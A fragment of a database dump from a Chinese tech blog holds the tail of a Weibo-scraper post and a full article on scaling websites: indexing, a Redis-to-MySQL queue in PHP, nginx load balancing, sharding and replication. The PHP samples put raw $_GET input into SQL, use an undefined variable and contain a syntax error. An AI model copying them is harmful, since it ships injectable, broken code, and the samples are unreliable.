nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(u&quot;名为&quot;,pathName,u&quot;的文件夹已经存在了！&quot;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\npa&nbsp;=&nbsp;paweibo()\r\npa.loginWeibo(&#39;帐号&#39;,&quot;密码&quot;)\r\npa.getPageFriends()\r\n#这个是爬单个好友的图片，不用注释掉\r\n#pa.getOneFriend(&#39;http://weibo.com/u/26862716**&#39;)</code></pre><h2>爬取成果</h2><p><img src=\"http://lzxya.kssws.ks-cdn.com/image_1457504385636251.png@base@tag=imgScale&q=100&w=690\" style=\"\" title=\"1457504385636251.png\"/></p><p><img src=\"http://lzxya.kssws.ks-cdn.com/image_1457504388706209.png@base@tag=imgScale&q=100&w=690\" style=\"\" title=\"1457504388706209.png\"/></p><p><img src=\"http://lzxya.kssws.ks-cdn.com/image_1457504388959982.png@base@tag=imgScale&q=100&w=690\" style=\"\" title=\"1457504388959982.png\"/></p><p><br/></p>',1457504547,'2016-10-14 08:46:02','0000-00-00 00:00:00',7,0,2,6,'http://7xq09h.com1.z0.glb.clouddn.com/image_1457504413350313.jpg?imageView2/1/w/210/h/140'),(126,0,'backend','一只特立独行的猪2号','网站数据库和服务器的各种优化和发展','【数据库】Sql语句优化和合理的索引，【分布式缓存】Memcache/Redis缓存的运用，【服务器】实现负载均衡【数据库】数据库的分库、分表、主从、集群、负载均衡。','网站优化方向','随着网站的发展并发数越来越高，这里面诸多的网站优化方案，所以我将自己所了解的优化方法记录下来，以供学习记录。','网站，优化','网站优化',302,'<p><img style=\"border-radius:4px\" src=\"http://7xq09h.com1.z0.glb.clouddn.com/145983967710.jpg\"/></p><p>这应该是我为一个客户处理的一个问题引发的思考吧...因为某客户需要使用我们公司的产品(CMS)，需要将旧站的数据迁移，这个数据是百万级的，百万级其实没必要去优化，合理的索引和字段设计加上Memcache/redis缓存完全能应付的来，我想到的是如果慢慢的数据到千万、亿呢，而且如果随着网站的发展并发数越来越高呢？这里面看起来有诸多的问题，所以我就将自己所了解的优化方法记录下来，以供学习记录。</p><p>最初的网站架构一般都将应用程序、数据库、文件部署在一台服务器上，这是最原始的网站部署，这时侯数据库压力应该是不大，但是随着业务的扩展，当一台服务器已经不能满足性能需求时，这个时候就应该逐步优化了，而且也算是网站发展的一个途径吧。</p><h2>【数据库】Sql语句优化和合理的索引</h2><p>这里主要是指关系型数据库的优化。还有众多的NoSql可以提升网站。而关系型数据库的Sql语句主要的优化思路就是尽量避免扫描过多的记录，比如全表扫描。所以就要用到索引了，索引并不是越多越好，索引固然可以提高相应的Select的效率，但同时也降低了Insert及Update的效率，因为Insert或Update时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定。有了合理的索引以后，优化方向大体来说就是sql语句是否能合理的运用到索引。比如像in和not in以及null和not null就无法用到索引，所以这种我们就需要避免使用，另外一个就是减少数据返回吧，也就是少用&#39;*&#39;来查询。而且优化还要从整体去考虑，有时当我优化一条语句后，其它查询反而效率被降低了，所以要取一个平衡点还要根据业务面去优化sql语句，这样才能达到最优效果。</p><p>例如：MYSQL运行很慢，在排除程序问题之后，该如何找出其中的原因？</p><p>1.开启mysql的慢查询日志，然后对记录的日志文件用mysql安装目录下的bin目录下的mysqldumpslow查看(perl脚本，window需先安装perl)，执行命令(<span style=\"color: rgb(51, 51, 51); font-family: &#39;Helvetica Neue&#39;, Helvetica, Arial, &#39;PingFang SC&#39;, &#39;Hiragino Sans GB&#39;, &#39;WenQuanYi Micro Hei&#39;, &#39;Microsoft Yahei&#39;, sans-serif; font-size: 14px; line-height: 22.4px; background-color: rgb(255, 255, 255);\">可以提取出top10慢的sql语句模式)</span>：</p><pre><code class=\"language-css\">mysqldumpslow&nbsp;-s&nbsp;c&nbsp;-t&nbsp;10&nbsp;/path/to/slow.log</code></pre><p>2.找到之后分析的最简单手段是explain查看执行计划，例如：</p><pre><code class=\"language-css\">explain&nbsp;select&nbsp;*&nbsp;from&nbsp;t&nbsp;where&nbsp;xxx&nbsp;order&nbsp;by&nbsp;xxx</code></pre><p>3.查看explain的结果，可以看出索引使用情况，排序方式等。具体的结果查看mysql官方文档中explain命令的解释最好了。优化的最主要手段是确保索引建立正确。如果索引方面没什么可优化的空间，那么多半是表结构设计不合理，或者查询方式组合不合理。这个就要结合具体的业务去进行数据存储结构或程序架构的优化了。</p><h2>【分布式缓存】Memcache/Redis缓存的运用</h2><p>分布式缓存在高并发的网站运营中可以说是大有用处，大部分网站访问都遵循28原则（即80%的访问请求，最终落在20%的数据上），所以我们可以对热点数据进行缓存，减少这些数据的访问路径，提高用户体验。这里就拿Redis来说，因为Redis功能比Memcache更为强大。</p><ol class=\"custom_num2 list-paddingleft-1\"><li class=\"list-num-3-1 list-num2-paddingleft-1\"><p>Redis不仅仅支持简单的k/v类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</p></li><li class=\"list-num-3-2 list-num2-paddingleft-1\"><p>Redis支持数据的备份，即master-slave模式的数据备份。</p></li><li class=\"list-num-3-3 list-num2-paddingleft-1\"><p>Redis支持数据的持久化，可以将内存中的数据保持在磁盘中，重启的时候可以再次加载进行使用。</p></li></ol><p>而在网站中Redis缓存往往运用在这些方面：</p><ul class=\" list-paddingleft-2\" style=\"list-style-type: disc;\"><li><p>基本的缓存数据（减少数据库压力）</p></li><li><p>消息队列（通知类、延迟更新类）</p></li><li><p>热点数据的实时缓存（比如feed，数据库、缓存同时写）</p></li><li><p>热点列表数据缓存（首页、热门话题等）</p></li></ul><p>跳过基本的缓存，说说队列，说一个简单的：redis队列缓存+mysql批量入库+php离线整合</p><h3>redis储存数据形成消息队列</h3><pre><code class=\"language-css\">//&nbsp;获取info\r\n$interface_info&nbsp;=&nbsp;$_GET[&#39;info&#39;];\r\n\r\n//&nbsp;存入redis队列\r\n$redis&nbsp;=&nbsp;new&nbsp;Redis();\r\n$redis-&gt;connect(&#39;xx&#39;,&nbsp;6379);\r\n$redis-&gt;auth(&quot;password&quot;);\r\n\r\n//&nbsp;加上时间戳存入队列\r\n$now_time&nbsp;=&nbsp;date(&quot;Y-m-d&nbsp;H:i:s&quot;);\r\n$redis-&gt;rPush(&quot;call_log&quot;,&nbsp;$interface_info&nbsp;.&nbsp;&quot;%&quot;&nbsp;.&nbsp;$now_time);\r\n$redis-&gt;close();</code></pre><h3>数据定时批量入库</h3><pre><code class=\"language-css\">//&nbsp;init&nbsp;redis\r\n$redis_xx&nbsp;=&nbsp;new&nbsp;Redis();\r\n$redis_xx-&gt;connect(&#39;ip&#39;,&nbsp;port);\r\n$redis_xx-&gt;auth(&quot;password&quot;);\r\n\r\n//&nbsp;获取现有消息队列的长度\r\n$count&nbsp;=&nbsp;0;\r\n$max&nbsp;=&nbsp;$redis_xx-&gt;lLen(&quot;call_log&quot;);\r\n\r\n//&nbsp;获取消息队列的内容，拼接sql\r\n$insert_sql&nbsp;=&nbsp;&quot;insert&nbsp;into&nbsp;fb_call_log&nbsp;(`interface_name`,&nbsp;`createtime`)&nbsp;values&nbsp;&quot;;\r\n\r\n//&nbsp;回滚数组\r\n$roll_back_arr&nbsp;=&nbsp;array();\r\nwhile&nbsp;($count&nbsp;&lt;&nbsp;$max)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;$log_info&nbsp;=&nbsp;$redis_cq01-&gt;lPop(&quot;call_log&quot;);&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;$roll_back_arr&nbsp;=&nbsp;$log_info;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($log_info&nbsp;==&nbsp;&#39;nil&#39;&nbsp;||&nbsp;!isset($log_info))&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$insert_sql&nbsp;.=&nbsp;&quot;;&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;切割出时间和info\r\n&nbsp;&nbsp;&nbsp;&nbsp;$log_info_arr&nbsp;=&nbsp;explode(&quot;%&quot;,$log_info);&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;$insert_sql&nbsp;.=&nbsp;&quot;&nbsp;(&#39;&quot;.$log_info_arr[0].&quot;&#39;,&#39;&quot;.$log_info_arr[1].&quot;&#39;),&quot;;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;$count++;\r\n}\r\n\r\n//&nbsp;判定存在数据，批量入库\r\nif&nbsp;($count&nbsp;!=&nbsp;0)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;$link_2004&nbsp;=&nbsp;mysql_connect(&#39;ip:port&#39;,&nbsp;&#39;user&#39;,&nbsp;&#39;password&#39;);&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!$link_2004)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;die(&quot;Could&nbsp;not&nbsp;connect:&quot;&nbsp;.&nbsp;mysql_error());\r\n&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;$crowd_db&nbsp;=&nbsp;mysql_select_db(&#39;fb_log&#39;,&nbsp;$link_2004);&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;$insert_sql&nbsp;=&nbsp;rtrim($insert_sql,&quot;,&quot;).&quot;;&quot;;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;mysql_query($insert_sql);&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;输出入库log和入库结果;\r\n&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;date(&quot;Y-m-d&nbsp;H:i:s&quot;).&quot;insert&nbsp;&quot;.$count.&quot;&nbsp;log&nbsp;info&nbsp;result:&quot;;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;json_encode($res);&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&lt;/br&gt;\\n&quot;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;数据库插入失败回滚\r\n&nbsp;&nbsp;&nbsp;&nbsp;if(!$res){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($roll_back_arr&nbsp;as&nbsp;$k){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$redis_xx-&gt;rPush(&quot;call_log&quot;,&nbsp;$k);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;释放连接\r\n&nbsp;&nbsp;&nbsp;&nbsp;mysql_free_result($res);\r\n&nbsp;&nbsp;&nbsp;&nbsp;mysql_close($link_2004);\r\n}\r\n\r\n//&nbsp;释放\r\nredis$redis_cq01-&gt;close();</code></pre><h3>离线时间统计和清理数据脚本</h3><pre><code class=\"language-css\">//&nbsp;离线统计\r\n$link_2004&nbsp;=&nbsp;mysql_connect(&#39;ip:port&#39;,&nbsp;&#39;user&#39;,&nbsp;&#39;pwd&#39;);\r\nif&nbsp;(!$link_2004)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;die(&quot;Could&nbsp;not&nbsp;connect:&quot;&nbsp;.&nbsp;mysql_error());\r\n}\r\n$crowd_db&nbsp;=&nbsp;mysql_select_db(&#39;fb_log&#39;,&nbsp;$link_2004);\r\n\r\n//&nbsp;统计昨天的数据\r\n$day_time&nbsp;=&nbsp;date(&quot;Y-m-d&quot;,&nbsp;time()&nbsp;-&nbsp;60&nbsp;*&nbsp;60&nbsp;*&nbsp;24&nbsp;*&nbsp;1);\r\n$static_sql&nbsp;=&nbsp;&quot;get&nbsp;sql&quot;;$res&nbsp;=&nbsp;mysql_query($static_sql,&nbsp;$link_2004);\r\n\r\n//&nbsp;获取结果入库\r\n//...\r\n\r\n//&nbsp;清理15天之前的数据\r\n$before_15_day&nbsp;=&nbsp;date(&quot;Y-m-d&quot;,&nbsp;time()&nbsp;-&nbsp;60&nbsp;*&nbsp;60&nbsp;*&nbsp;24&nbsp;*&nbsp;15);\r\n$delete_sql&nbsp;=&nbsp;&quot;delete&nbsp;from&nbsp;xxx&nbsp;where&nbsp;createtime&nbsp;&lt;&nbsp;&#39;&quot;&nbsp;.&nbsp;$before_15_day&nbsp;.&nbsp;&quot;&#39;&quot;;\r\ntry&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;mysql_query($delete_sql);\r\n}catch(Exception&nbsp;$e){&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;json_encode($e).&quot;\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;delete&nbsp;result:&quot;.json_encode($res).&quot;\\n&quot;;\r\n}\r\n\r\nmysql_close($link_2004);</code></pre><p>然后部署代码。</p><p>最后两个热点数据的处理我的理解就是区分强一致实时性的数据是否需要redis去处理，因为redis也支持数据的持久化。</p><h2>【服务器】实现负载均衡</h2><p>解决大访问量的方案其实有硬件和软件两个大类的方法，硬件一般比较贵，所以一般使用负载均衡...常用的负载均衡技术软件有LVS、Nginx、HAProxy。LVS是四层负载均衡，根据目标地址和端口选择内部服务器，Nginx是七层负载均衡和HAProxy支持四层、七层负载均衡，可以根据报文内容选择内部服务器，因此LVS分发路径优于Nginx和HAProxy，性能要高些，而Nginx和HAProxy则更具配置性，如可以用来做动静分离，这里主要说说nginx的的均衡负载。</p><p>主要实现就是通过一台分发服务器将请求分发到多个应用服务器，一般采用轮询的方法，但是轮询并不是最佳方法，更好的方法是通过应用服务器的性能反馈来分发请求。</p><p>分发服务器配置</p><pre><code class=\"language-css\">upstream&nbsp;site&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#按照权重大小分配服务器轮询机率，如果全不指定weight则按时间逐个轮询\r\n&nbsp;&nbsp;&nbsp;&nbsp;server&nbsp;192.168.1.60:80&nbsp;weight=3;&nbsp;#&nbsp;应用服务器1\r\n&nbsp;&nbsp;&nbsp;&nbsp;server&nbsp;192.168.1.53:08&nbsp;weight=5;&nbsp;#&nbsp;应用服务器2\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#根据ip_hash分配服务器，每个ip固定访问一台服务器，可解决session问题，但通常session问题通常都是写入固定memcached或redis服务器来解决的。\r\n&nbsp;&nbsp;&nbsp;&nbsp;#ip_hash;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#server&nbsp;192.168.1.60:80;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#server&nbsp;192.168.1.53:80;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;#3、fair根据响应时间分配，好像要第三方插件支持\r\n&nbsp;&nbsp;&nbsp;&nbsp;#4、url_hash根据url分配，好像也需要第三方插件支持\r\n}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\nserver&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;listen&nbsp;80;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;server_name&nbsp;site.com;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;location&nbsp;/&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proxy_pass&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http://site;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</code></pre><p>而后面的应用服务器，即可以是nginx也可以apache、tomcat等，这样就能然请求分配到两个不同的应用服务器啦，接下来需要就是session问题：</p><ul class=\" list-paddingleft-2\" style=\"list-style-type: disc;\"><li><p>iphash,把特定ip发送给特定主机，就不存在session这个问题了，因为1个用户对应1台主机。但是某时刻当来自某个IP地址的请求特别多，那么将导致某台应用服务器的压力可能非常大，而其他应用服务器却空闲的不均衡情况，这就违背了我们负载均衡的初衷。</p></li><li><p>搭建redis集群或者memcached集群，用集群自带的同步方法来帮我们在不同的主机中同步session，这样就相当于把原来的一份session变成了N分session，session的同步就依赖于NoSql集群的同步了。</p></li><li><p>不使用session，换作cookie。但是秉承着防御性编程的原则，我们不能相信用户输入，因为cookie可能被禁用，甚至篡改。</p></li><li><p>单独设置一个session服务器，负载服务器得到一个sessionid过后，去session服务器获得会话状态，然后根据状态来响应用户请求，如果会话状态为空，则在session服务器中设置一个会话状态，然后返回给用户一个sessionid。</p></li></ul><p>所以采用第四种，下面利用分发服务器同时作为session服务器（用redis实现），应用服务器每次都要向分发服务器请求用户的session对应的会话状态，以此决定响应方式。</p><p>应用服务器接受请求时判断请求是否带有sessionid这个参数。</p><ul class=\" list-paddingleft-2\" style=\"list-style-type: disc;\"><li><p>如果没有，则创建session利用redis保存在分发服务器上的redis缓存内。</p></li><li><p>如果有，则向保存sessioin的分发服务器上获取相应的session缓存数据，如果获取的数据无效，则再重复上一步。<br/></p></li></ul><h2>【数据库】数据库的分库、分表、主从、集群、负载均衡。</h2><p>随着网站的发展，数据库将会成为最大的瓶颈，改善数据库性能常用的手段是进行读写分离以及分表，读写分离顾名思义就是将数据库分为读库和写库，通过主备功能实现数据同步。分库分表则分为水平切分和垂直切分，水平切换则是对一个数据库特大的表进行拆分，例如用户表。垂直切分则是根据业务不同来切分。</p><h3>分库、分表（水平切分、垂直切分）</h3><p>数据切分可以是物理上的，对数据通过一系列的切分规则将数据分布到不同的数据库服务器上，通过路由规则路由访问特定的数据库，这样一来每次访问面对的就不是单台服务器了，而是N台服务器，这样就可以降低单台机器的负载压力。</p><p>数据切分也可以是数据库内的，对数据通过一系列的切分规则，将数据分布到一个数据库的不同表 中，比如将article分为article_001,article_002等子表，若干个子表水平拼合有组成了逻辑上一个完整的article表，这 样做的目的其实也是很简单的。&nbsp;举个例子说明，比如article表中现在有5000w条数据，此时我们需要在这个表中增加（insert）一条新的数 据，insert完毕后，数据库会针对这张表重新建立索引，5000w行数据建立索引的系统开销还是不容忽视的。但是反过来，假如我们将这个表分成100 个table呢，从article_001一直到article_100，5000w行数据平均下来，每个子表里边就只有50万行数据，这时候我们向一张 只有50w行数据的table中insert数据后建立索引的时间就会呈数量级的下降，极大了提高了DB的运行时效率，提高了数据库的并发量。当然分表的好 处还不知这些，还有诸如写操作的锁操作等，都会带来很多显然的好处。</p><p>所以，分库降低了单点机器的负载；分表，提高了数据操作的效率，尤其是Write操作的效率。</p><p>要想做到数据的水平切分，在每一个表中都要有相冗余字符作为切分依据和标记字段，通常的应用中我们选用user_id作为区分字段，基于此就有如下三种分库的方式和规则（当然还可以有其他的方式）：</p><p>(1) user_id为区分，1～1000的对应DB1，1001～2000的对应DB2，以此类推；</p><ul class=\" list-paddingleft-2\" style=\"list-style-type: disc;\"><li><p>优点：可部分迁移</p></li><li><p>缺点：数据分布不均</p></li></ul><p>(2) hash取模分：</p><p>对user_id进行hash（或者如果user_id是数值型的话直接使用user_id 的值也可），然后用一个特定的数字，比如应用中需要将一个数据库切分成4个数据库的话，我们就用4这个数字对user_id的hash值进行取模运算，也 就是user_id%4,这样的话每次运算就有四种可能：结果为1的时候对应DB1；结果为2的时候对应DB2；结果为3的时候对应DB3；结果为0的时 候对应DB4，这样一来就非常均匀的将数据分配到4个DB中。</p><ul class=\" list-paddingleft-2\" style=\"list-style-type: disc;\"><li><p>优点：数据分布均匀</p></li><li><p>缺点：数据迁移的时候麻烦，不能按照机器性能分摊数据</p></li></ul><p>(3) 在认证库中保存数据库配置</p><p>就是建立一个DB，这个DB单独保存user_id到DB的映射关系，每次访问数据库的时候都要先查询一次这个数据库，以得到具体的DB信息，然后才能进行我们需要的查询操作。</p><ul class=\" list-paddingleft-2\" style=\"list-style-type: disc;\"><li><p>优点：灵活性强，一对一关系</p></li><li><p>缺点：每次查询之前都要多一次查询，性能大打折扣</p></li></ul><p>以上就是通常的开发中我们选择的三种方式，有些复杂的项目中可能会混合使用这三种方式。</p><h3>读写分离（主从复制）</h3><p>Mysql内建的复制功能是构建大型，高性能应用程序的基础。将Mysql的数据分布到多个系统上去，这种分布的机制，是通过将Mysql的某一台主机的数据复制到其它主机（slaves）上，并重新执行一遍来实现的。复制过程中一个服务器充当主服务器，而一个或多个其它服务器充当从服务器。主服务器将更新写入二进制日志文件，并维护文件的一个索引以跟踪日志循环。这些日志可以记录发送到从服务器的更新。当一个从服务器连接主服务器时，它通知主服务器从服务器在日志中读取的最后一次成功更新的位置。从服务器接收从那时起发生的任何更新，然后封锁并等待主服务器通知新的更新。</p><p><strong>主从复制的步骤</strong><span style=\"color: rgb(255, 0, 0);\">&nbsp;</span></p><p>(1) master将改变记录到二进制日志(binary log)中（这些记录叫做二进制日志事件，binary log events）；<br/>(2) slave将master的binary log events拷贝到它的中继日志(relay log)；<br/>(3) slave重做中继日志中的事件，将改变反映它自己的数据。</p><p>第一部分就是master记录二进制日志。在每个事务更新数据完成之前，master在二日志记录这些改变。MySQL将事务串行的写入二进制日志，即使事务中的语句都是交叉执行的。在事件写入二进制日志完成后，master通知存储引擎提交事务。</p><p>下一步就是slave将master的binary log拷贝到它自己的中继日志。首先，slave开始一个工作线程——I/O线程。I/O线程在master上打开一个普通的连接，然后开始binlog dump process。Binlog dump process从master的二进制日志中读取事件，如果已经跟上master，它会睡眠并等待master产生新的事件。I/O线程将这些事件写入中继日志。</p><p>SQL slave thread（SQL从线程）处理该过程的最后一步。SQL线程从中继日志读取事件，并重放其中的事件而更新slave的数据，使其与master中的数据一致。只要该线程与I/O线程保持一致，中继日志通常会位于OS的缓存中，所以中继日志的开销很小。此外，在master中也有一个工作线程：和其它MySQL的连接一样，slave在master中打开一个连接也会使得master开始一个线程。复制过程有一个很重要的限制——复制在slave上是串行化的，也就是说master上的并行更新操作不能在slave上并行操作。</p><p><strong>主从复制的配置</strong></p><p>负责在主、从服务器传输各种修改动作的媒介是主服务器的二进制变更日志，这个日志记载着需要传输给从服务器的各种修改动作。因此，主服务器必须激活二进制日志功能。从服务器必须具备足以让它连接主服务器并请求主服务器把二进制变更日志传输给它的权限。另外，在配置前他们主从数据库的数据一定要保持相同！</p><p>master配置:</p><pre><code class=\"language-css\">server-id=1\r\nlog-bin=mysql-bin\r\nserver-id：为主服务器A的ID值\r\nlog-bin：二进制变更日值</code></pre><p>slave配置:<br/></p><pre><code class=\"language-css\">log_bin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;mysql-bin\r\nserver_id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;2\r\nrelay_log&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;mysql-relay-bin\r\nlog_slave_updates&nbsp;=&nbsp;1\r\nread_only&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;1</code></pre><p>server_id是必须的，而且唯一。slave没有必要开启二进制日志，但是在一些情况下，必须设置，例如，如果slave为其它slave的master，必须设置bin_log。在这里，我们开启了二进制日志，而且显示的命名(默认名称为hostname，但是，如果hostname改变则会出现问题)。<br/></p><p>relay_log配置中继日志，log_slave_updates表示slave将复制事件写进自己的二进制日志(后面会看到它的用处)。有些人开启了slave的二进制日志，却没有设置log_slave_updates，然后查看slave的数据是否改变，这是一种错误的配置。所以，尽量使用read_only，它防止改变数据(除了特殊的线程)。但是，read_only并是很实用，特别是那些需要在slave上创建表的应用。</p><p>以上正是主从复制，实现读写分离可以通过代理服务器来实现，比如Mysql-Proxy，但是MySQL-Proxy的读写分离主要是通过rw-splitting.lua脚本实现的，因此需要安装和使用lua。具体使用看链接<a href=\"http://www.open-open.com/lib/view/open1410503598258.html\" target=\"_blank\" title=\"MySQL主从复制与读写分离\">MySQL主从复制与读写分离</a>。另外如果对lua不了解或者使用不了，其实还可以考虑用一款国产的Proxy-Amoeba，Amoeba是阿里云杭州研究院开发的一个以MySQL为底层数据存储，并对应用提供MySQL协议接口的Proxy，不过现在还只是Beta版本，但是也已经有部署了，而且稳定性要超过Mysql-Proxy。具体使用看链接<a href=\"http://www.lxway.com/56146024.htm\" target=\"_blank\" title=\"Mysql复制及代理\">Mysql复制及代理</a>。</p><h3>集群、负载均衡</h3><p>仅仅是分库分表的数据层设计也是不够完善的，当某个节点上的数据库服务器出现了宕机的情况的时候，会是什么样的呢？是的，我们采用了数据库切分方案，也就是说有N台机器组成了一个完整的数据库，如果有一台机器宕机的话，也仅仅是一个数据库的N分之一的数据不能访问而已，这是我们能接受的，起码比切分之前的情况好很多了，总不至于整个数据库都不能访问。一般的应用中，这样的机器故障导致的数据无法访问是可 以接受的，假设我们的系统是一个高并发的电子商务网站呢？单节点机器宕机带来的经济损失是非常严重的。也就是说，现在我们这样的方案还是存在问题的，容错 性能是经不起考验的。当然了，问题总是有解决方案的。所以引入集群的概念，在此我称之为Group。</p><p>在没有引入集群以前，我们的一次查询的过程大致如下：请求数据层，并传递必要的分库区分字段（通常情况下是user_id）数据层根据区分字段Route到具体的数据库，在这个确定的数据库内进行数据操作。&nbsp;这是没有引入集群的情况，当时引入集群会是什么样子的呢？路由器上规则和策略其实只能路由到具体的一个Group，也就是只能路由到一个虚拟的Group，这个Group并不是某个特定的物理服务器，而是由一个主数据库服务器和多个从数据库服务器的组合（上一篇的主从复制）。接下来需要做的工作就是找到具体的物理的数据库服务器，以进行具体的数据操作。基于这个环节的需求，我们引入了负载均衡器的概念 （<span style=\"color: rgb(51, 51, 51); font-family: 微软雅黑, Verdana, sans-serif, 宋体; font-size: 12.5px; letter-spacing: 0.5px; line-height: 22.5px; background-color: rgb(255, 255, 255);\">LoadBalancePolicy简称LB，也就是上面Mysql读写分离的代理服务器</span>）。</p><p>负载均衡器的职责就是定位到一台具体的数据库服务器，具体的规则如下：负载均衡器会分析当前sql的读写特性，如果是写操作或者是要求实时性很强的操作的话，直接将查询负载分到Master，如果是读操作则通过负载均衡策略分配一个Slave。我们的负载均衡器的主要研究放向也就是负载分发策略，通常情况下负载均衡包括随机负载均衡和加权负载均衡&nbsp;。随机负载均衡很好理解，就是从N个Slave中随机选取一个Slave。这样的随机负载均衡是不考虑 机器性能的，它默认为每台机器的性能是一样的。假如真实的情况是这样的，这样做也是无可厚非的。假如实际情况并非如此呢？每个Slave的机器物理性能和配置不一样的情况，再使用随机的不考虑性能的负载均衡，是非常不科学的，这样一来会给机器性能差的机器带来不必要的高负载，甚至带来宕机的危险，&nbsp;同时高性能的数据库服务器也不能充分发挥其物理性能。基于此考虑从，我们引入了加权负载均衡，也就是在我们的系统内部通过一定的接口，可以给每台DB服务器分配一个权值，然后再运行时LB根据权值在集群中的比重，分配一定比例的负载给该数据库服务器。</p><p><br/></p><p>参考文章：</p><p><a href=\"http://cuihuan.net/article/%E3%80%90%E9%AB%98%E5%B9%B6%E5%8F%91%E7%AE%80%E5%8D%95%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E3%80%91redis%E7%BC%93%E5%AD%98%E9%98%9F%E5%88%97-mysql-%E6%89%B9%E9%87%8F%E5%85%A5%E5%BA%93-php%E7%A6%BB.html\" 